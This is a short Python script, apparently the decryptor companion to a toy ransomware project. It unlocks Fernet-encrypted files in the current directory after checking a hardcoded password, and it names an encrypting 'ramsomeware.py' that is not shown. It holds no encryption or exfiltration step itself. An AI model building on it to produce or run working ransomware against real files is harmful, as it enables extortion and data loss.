import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file== "ramsomeware.py" or file == "Scheleton-key.key" or file == "decryption.py" or file == "help.txt" :
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

with open("Scheleton-key.key", "rb") as key:
    secretkey = key.read()

secret_phrase = "Anonymous"
user_phrase = input("Enter Password: ")

if user_phrase == secret_phrase:
    for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("File Have been Decrypted")
else:
    print ("Still decrypted")